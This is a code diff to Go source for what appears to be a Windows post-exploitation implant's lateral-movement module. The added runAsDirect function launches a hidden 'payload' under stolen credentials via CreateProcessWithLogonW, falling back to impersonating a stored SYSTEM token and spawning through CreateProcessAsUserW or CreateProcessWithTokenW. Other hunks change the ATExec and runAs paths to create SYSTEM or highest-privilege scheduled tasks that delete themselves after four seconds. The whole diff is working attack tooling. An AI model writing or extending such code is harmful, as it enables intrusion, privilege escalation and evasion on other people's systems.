@@ -29,6 +29,7 @@ var (
 	procDeleteServiceLat    = modAdvapi32lat.NewProc("DeleteService")
 	procCloseServiceHandleLat = modAdvapi32lat.NewProc("CloseServiceHandle")
 	procControlServiceLat   = modAdvapi32lat.NewProc("ControlService")
+	procCreateProcessWithLogonWLat = modAdvapi32lat.NewProc("CreateProcessWithLogonW")
 )
 
 const (
@@ -501,10 +502,11 @@ func lateralATExec(host string, data []byte, svcName, user, pass string) (string
 	}
 
 	taskName := `\` + svcName
+	startAt := time.Now().Add(2 * time.Minute).Format("15:04")
 
 	// Create task: run as SYSTEM, one-time, execute immediately via /RUN
-	createArgs := fmt.Sprintf(`/Create /TN "%s" /TR "%s" /SC ONCE /ST 00:00 /RU SYSTEM /F`,
-		taskName, localPath)
+	createArgs := fmt.Sprintf(`/Create /TN "%s" /TR "%s" /SC ONCE /ST %s /RU SYSTEM /F`,
+		taskName, localPath, startAt)
 	if out, err := sch(createArgs); err != nil {
 		return out, fmt.Errorf("atexec create task %s: %w", host, err)
 	}
@@ -561,11 +563,136 @@ func lateralDCOM(host string, data []byte, svcName, user, pass string) (string, 
 
 // ── runAs ─────────────────────────────────────────────────────────────────────
 
-// lateralRunAs spawns the payload as a different local user via the Task
-// Scheduler. Unlike WMI/SMBExec/PSExec, this does NOT open a network session
-// to the SCM, so Windows loopback restrictions do not apply. The Task
-// Scheduler service (SYSTEM) validates the credentials and launches the
-// process as the target user.
+// runAsDirect starts the child immediately with supplied credentials and does
+// not require a scheduled task. If Secondary Logon is unavailable, fall back
+// to a primary token plus CreateProcessAsUserW/CreateProcessWithTokenW.
+func runAsDirect(localPath, user, pass string) (uint32, string, error) {
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+
+	domain, username := splitDomainUser(user)
+	userW, err := syscall.UTF16PtrFromString(username)
+	if err != nil {
+		return 0, "", fmt.Errorf("invalid username: %w", err)
+	}
+	domainW, err := syscall.UTF16PtrFromString(domain)
+	if err != nil {
+		return 0, "", fmt.Errorf("invalid domain: %w", err)
+	}
+	passW, err := syscall.UTF16PtrFromString(pass)
+	if err != nil {
+		return 0, "", fmt.Errorf("invalid password: %w", err)
+	}
+	appW, err := syscall.UTF16PtrFromString(localPath)
+	if err != nil {
+		return 0, "", fmt.Errorf("invalid payload path: %w", err)
+	}
+	cmdW, err := syscall.UTF16PtrFromString(`"` + localPath + `"`)
+	if err != nil {
+		return 0, "", fmt.Errorf("invalid payload command line: %w", err)
+	}
+	cwdW, _ := syscall.UTF16PtrFromString(`C:\Windows\System32`)
+
+	var si windows.StartupInfo
+	si.Cb = uint32(unsafe.Sizeof(si))
+	si.Flags = windows.STARTF_USESHOWWINDOW
+	si.ShowWindow = 0
+	var pi windows.ProcessInformation
+
+	// LOGON_WITH_PROFILE is intentionally not used: the child only needs a
+	// valid local logon token and loading the full user profile is unnecessary.
+	r, _, e := procCreateProcessWithLogonWLat.Call(
+		uintptr(unsafe.Pointer(userW)), uintptr(unsafe.Pointer(domainW)),
+		uintptr(unsafe.Pointer(passW)), 0,
+		uintptr(unsafe.Pointer(appW)), uintptr(unsafe.Pointer(cmdW)),
+		0x08000000, 0, uintptr(unsafe.Pointer(cwdW)),
+		uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)),
+	)
+	logonErr := uint32(0)
+	if r == 0 {
+		logonErr = winErrno(e)
+	} else {
+		pid := pi.ProcessId
+		windows.CloseHandle(pi.Process)
+		windows.CloseHandle(pi.Thread)
+		return pid, "CreateProcessWithLogonW", nil
+	}
+
+	// Compatibility path for systems where Secondary Logon is disabled or
+	// blocked. Use the stored SYSTEM token when available so the fallback has
+	// the same privilege context as the post-getsystem shell.
+	if gSystemToken != 0 {
+		if ir, _, ie := procImpersonateLoggedOnUser.Call(uintptr(gSystemToken)); ir != 0 {
+			defer procRevertToSelf2.Call()
+			_ = enableTokenPrivilege(windows.Handle(gSystemToken), "SeImpersonatePrivilege")
+			_ = enableTokenPrivilege(windows.Handle(gSystemToken), "SeIncreaseQuotaPrivilege")
+			_ = enableTokenPrivilege(windows.Handle(gSystemToken), "SeAssignPrimaryTokenPrivilege")
+		} else {
+			_ = ie // retain the CreateProcessWithLogonW error for diagnostics
+		}
+	}
+	_ = enablePrivilege("SeImpersonatePrivilege")
+	_ = enablePrivilege("SeIncreaseQuotaPrivilege")
+	_ = enablePrivilege("SeAssignPrimaryTokenPrivilege")
+
+	var token windows.Token
+	batchErr := uint32(0)
+	interactiveErr := uint32(0)
+	r, _, e = procLogonUserW.Call(
+		uintptr(unsafe.Pointer(userW)), uintptr(unsafe.Pointer(domainW)),
+		uintptr(unsafe.Pointer(passW)), 4, 0,
+		uintptr(unsafe.Pointer(&token)),
+	)
+	if r == 0 {
+		batchErr = winErrno(e)
+		r, _, e = procLogonUserW.Call(
+			uintptr(unsafe.Pointer(userW)), uintptr(unsafe.Pointer(domainW)),
+			uintptr(unsafe.Pointer(passW)), 2, 0,
+			uintptr(unsafe.Pointer(&token)),
+		)
+		if r == 0 {
+			interactiveErr = winErrno(e)
+			return 0, "", fmt.Errorf("CreateProcessWithLogonW=%d; LogonUser batch=%d interactive=%d",
+				logonErr, batchErr, interactiveErr)
+		}
+	}
+	defer windows.CloseHandle(windows.Handle(token))
+
+	var asUserErr, withTokenErr uint32
+	usedToken := false
+	cmdAsUserW, _ := syscall.UTF16PtrFromString(`"` + localPath + `"`)
+	r, _, e = procCreateProcessAsUserW2.Call(
+		uintptr(token), uintptr(unsafe.Pointer(appW)), uintptr(unsafe.Pointer(cmdAsUserW)),
+		0, 0, 0, 0x08000000, 0, uintptr(unsafe.Pointer(cwdW)),
+		uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)),
+	)
+	if r == 0 {
+		asUserErr = winErrno(e)
+		usedToken = true
+		cmdWithTokenW, _ := syscall.UTF16PtrFromString(`"` + localPath + `"`)
+		r, _, e = procCreateProcessWithTokenW2.Call(
+			uintptr(token), 0, uintptr(unsafe.Pointer(appW)), uintptr(unsafe.Pointer(cmdWithTokenW)),
+			0x08000000, 0, uintptr(unsafe.Pointer(cwdW)),
+			uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)),
+		)
+		if r == 0 {
+			withTokenErr = winErrno(e)
+			return 0, "", fmt.Errorf("CreateProcessWithLogonW=%d; AsUser=%d WithToken=%d",
+				logonErr, asUserErr, withTokenErr)
+		}
+	}
+
+	pid := pi.ProcessId
+	windows.CloseHandle(pi.Process)
+	windows.CloseHandle(pi.Thread)
+	if usedToken {
+		return pid, "CreateProcessWithTokenW", nil
+	}
+	return pid, "CreateProcessAsUserW", nil
+}
+
+// lateralRunAs spawns the payload as a different local user. It does not open
+// a network session to the SCM, so Windows loopback restrictions do not apply.
 //
 // Only works for local targets; use dcom/psexec for remote hosts.
 func lateralRunAs(host string, data []byte, existingPath, svcName, user, pass string) (string, error) {
@@ -610,54 +737,48 @@ func lateralRunAs(host string, data []byte, existingPath, svcName, user, pass st
 		}
 	}
 
-	// Parse domain\user  →  ruAccount for /RU flag
-	domain, username := ".", user
-	if idx := strings.IndexByte(user, '\\'); idx >= 0 {
-		domain, username = user[:idx], user[idx+1:]
-	} else if idx := strings.IndexByte(user, '@'); idx >= 0 {
-		username, domain = user[:idx], user[idx+1:]
-	}
-	// For local accounts (domain "."), use bare username — schtasks on some
-	// Windows versions rejects "." as a domain alias and fails with
-	// ERROR_NONE_MAPPED. Bare username resolves correctly via SAM.
-	var ruAccount string
-	if domain == "." {
-		ruAccount = username
+	if pid, method, err := runAsDirect(localPath, user, pass); err == nil {
+		return fmt.Sprintf("[+] runas → %s @ %s\n    path: %s\n    pid: %d\n    method: %s",
+			user, host, localPath, pid, method), nil
 	} else {
-		ruAccount = domain + `\` + username
+		// Keep the diagnostic and use the legacy scheduler only as a last resort.
+		// It is included in the eventual error so a rejected direct launch is not
+		// mistaken for a successful process start.
+		directErr := err.Error()
+		taskName := svcName
+		domain, username := ".", user
+		if idx := strings.IndexByte(user, '\\'); idx >= 0 {
+			domain, username = user[:idx], user[idx+1:]
+		} else if idx := strings.IndexByte(user, '@'); idx >= 0 {
+			username, domain = user[:idx], user[idx+1:]
+		}
+		ruAccount := username
+		if domain != "." {
+			ruAccount = domain + `\` + username
+		}
+		startAt := time.Now().Add(2 * time.Minute).Format("15:04")
+		out, createErr := exec.Command("schtasks",
+			"/create", "/RU", ruAccount, "/RP", pass,
+			"/TR", localPath, "/TN", taskName,
+			"/SC", "ONCE", "/ST", startAt, "/RL", "HIGHEST", "/F",
+		).CombinedOutput()
+		if createErr != nil {
+			return "", fmt.Errorf("runas: direct launch failed: %s\nrunas: schtasks /create: %w\n%s",
+				directErr, createErr, strings.TrimSpace(string(out)))
+		}
+		runOut, runErr := exec.Command("schtasks", "/run", "/TN", taskName).CombinedOutput()
+		if runErr != nil {
+			exec.Command("schtasks", "/delete", "/TN", taskName, "/F").Run()
+			return "", fmt.Errorf("runas: direct launch failed: %s\nrunas: schtasks /run: %w\n%s",
+				directErr, runErr, strings.TrimSpace(string(runOut)))
+		}
+		go func() {
+			time.Sleep(4 * time.Second)
+			exec.Command("schtasks", "/delete", "/TN", taskName, "/F").Run()
+		}()
+		return fmt.Sprintf("[+] runas → %s @ %s\n    path: %s\n    task: %s (deleted in 4s)\n    direct launch failed: %s",
+			ruAccount, host, localPath, taskName, directErr), nil
 	}
-
-	taskName := svcName
-
-	// Create ephemeral task running as target user
-	out, err := exec.Command("schtasks",
-		"/create",
-		"/RU", ruAccount, "/RP", pass,
-		"/TR", localPath,
-		"/TN", taskName,
-		"/SC", "ONCE", "/ST", "00:00", "/RL", "HIGHEST",
-		"/F",
-	).CombinedOutput()
-	if err != nil {
-		return "", fmt.Errorf("runas: schtasks /create: %w\n%s", err, strings.TrimSpace(string(out)))
-	}
-
-	// Run immediately and propagate a scheduler failure.  Returning success
-	// after a rejected /run leaves the operator believing the child agent was
-	// started when only the task definition exists.
-	runOut, runErr := exec.Command("schtasks", "/run", "/TN", taskName).CombinedOutput()
-	if runErr != nil {
-		exec.Command("schtasks", "/delete", "/TN", taskName, "/F").Run()
-		return "", fmt.Errorf("runas: schtasks /run: %w\n%s", runErr, strings.TrimSpace(string(runOut)))
-	}
-
-	// Delete after the process has had time to start
-	go func() {
-		time.Sleep(4 * time.Second)
-		exec.Command("schtasks", "/delete", "/TN", taskName, "/F").Run()
-	}()
-
-	return fmt.Sprintf("[+] runas → %s @ %s\n    path: %s\n    task: %s (deleted in 4s)", ruAccount, host, localPath, taskName), nil
 }
 
 // ── dispatcher ────────────────────────────────────────────────────────────────
